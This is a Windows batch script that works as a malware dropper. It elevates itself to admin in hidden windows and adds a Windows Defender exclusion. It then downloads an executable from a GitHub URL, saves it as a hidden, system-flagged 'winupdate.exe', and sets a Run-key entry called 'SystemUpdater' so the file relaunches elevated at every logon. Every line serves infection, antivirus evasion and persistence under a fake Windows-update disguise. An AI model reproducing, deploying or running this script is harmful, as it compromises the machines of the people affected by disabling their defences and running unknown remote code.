��
@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit
)

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows\Temp'"

set "file=%TEMP%\winupdate.exe"

powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/blackcode2290/test2/raw/refs/heads/main/december-h.exe', '%file%')"

attrib +h +s "%file%"

reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "%file%" /t REG_SZ /d "RUNASADMIN" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdater" /t REG_SZ /d "cmd /c start /b powershell -WindowStyle Hidden -Command \"Start-Process '%file%' -Verb RunAs\"" /f

powershell -WindowStyle Hidden -Command "Start-Process '%file%' -Verb RunAs"

exit
